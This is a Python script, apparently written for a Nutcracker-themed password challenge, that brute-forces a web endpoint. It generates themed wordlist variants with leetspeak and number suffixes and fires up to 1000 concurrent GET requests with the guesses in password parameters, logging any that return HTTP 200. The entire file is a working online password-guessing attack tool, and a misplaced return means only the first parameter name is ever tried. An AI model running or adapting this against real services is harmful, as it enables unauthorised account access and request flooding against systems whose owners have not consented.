import asyncio
import string
import aiohttp
import time
from logger import logger
from env import get_url

## tried relavnt combination and refrences from nutcraker in diff combinations


CONCURRENT_ATTEMPTS = 1000

async def try_password(session, url, prefix,password):
    params = {prefix: password}
    try:
        async with session.get(url, params=params) as response:
            return password, response.status, await response.text()
    except asyncio.TimeoutError:
        logger.debug(f"Timeout with password: {password}")
        return password, None, None

def convert_to_leetspeak(word):
    """Converts a word to leetspeak by replacing specific characters."""
    leet_dict = {
        'a': '4', 'e': '3', 'i': '1', 'o': '0',
        's': '5', 't': '7', 'l': '1', 'b': '8'
    }
    return ''.join(leet_dict.get(char.lower(), char) for char in word)
def combine_terms(base, additions, leet_base=None):
    """Generates combinations of base terms with additional elements."""
    for add in additions:
        yield f"{base}{add}"
        yield f"{add}{base}"
        if leet_base:
            yield f"{leet_base}{add}"
            yield f"{add}{leet_base}"

def password_generator(base_terms, numbers):
    
    leet_bases = {base: convert_to_leetspeak(base) for base in base_terms}
    
    for base in base_terms:
        yield base
        yield base.lower()
        yield leet_bases[base]

 
        for base in base_terms:
            leet_base = leet_bases[base]
            # Generate combinations with numbers
            yield from combine_terms(f"{base}", numbers, f"{leet_base}")
            yield from combine_terms(f"{base.lower()}", numbers)
            # Generate combinations with other base terms
            for base2 in base_terms:
                if base != base2:
                    yield from combine_terms(f"{base}", [base2, base2.lower()], f"{leet_base}")
                    leet_base2 = leet_bases[base2]
                    yield from combine_terms(f"{leet_base}", [leet_base2, f"{leet_base2}2021", f"{leet_base2}01"])

async def brute_force_password(session, url, passwords,prefixes_request):
    tasks = []
    total_requests = 0
    successful_attempts = 0
    failed_attempts = 0
    for prefix in prefixes_request:
        for password in passwords:
            tasks.append(try_password(session, url,prefix, password))
            
            if len(tasks) >= CONCURRENT_ATTEMPTS:
                results = await asyncio.gather(*tasks)
                for password, status, text in results:
                    total_requests += 1
                    if status == 200:
                        successful_attempts += 1
                        logger.critical(f"Password found: {password}")
                        logger.critical(f"Response: {text}")
                        return password, total_requests, successful_attempts, failed_attempts
                    else:
                        failed_attempts += 1
                        logger.debug(f"Password {password} failed")
                tasks = []  # Reset tasks once done

        # Process any remaining passwords if they exist
        if tasks:
            results = await asyncio.gather(*tasks)
            for password, status, text in results:
                total_requests += 1
                if status == 200:
                    successful_attempts += 1
                    logger.critical(f"Password found: {password}")
                    logger.critical(f"Response: {text}")
                    return password, total_requests, successful_attempts, failed_attempts
                else:
                    failed_attempts += 1
                    logger.debug(f"Password {password} failed")

        return None, total_requests, successful_attempts, failed_attempts

async def main():
    url = get_url()
    base_terms = [
        "Nutcracker", "Clara", "Sugarplum", "Mouseking", "Tchaikovsky",
        "Drosselmeyer", "Marie", "Prince", "Ballet", "Marche",
        "SugarPlumFairy", "Snowflakes", "Overture", "WaltzOfTheFlowers",
        "BattleScene", "ChristmasEve",'nut', 'cracker', 'clara', 'sugarplum', 'mouseking', 'tchaikovsky'
    ]
    numbers = ["01", "123", "2021", "1892", "12", "25", "1812", "2022", "2023","2024","2025"]
    prefixes_request = ['pwd', 'password', 'pass']
    start_time = time.time()
    passwords = password_generator(base_terms, numbers)
    async with aiohttp.ClientSession() as session:
        password, total_requests, successful_attempts, failed_attempts = await brute_force_password(session, url, passwords,prefixes_request)
        time_elapsed = time.time() - start_time
        logger.critical(f"Total requests: {total_requests}")
        logger.critical(f"Successful attempts: {successful_attempts}")
        logger.critical(f"Failed attempts: {failed_attempts}")
        logger.critical(f"Time taken: {time_elapsed:.2f} seconds")
        if password:
            logger.critical("Password found!")
        else:
            logger.critical("Password not found")

if __name__ == '__main__':
    asyncio.run(main())
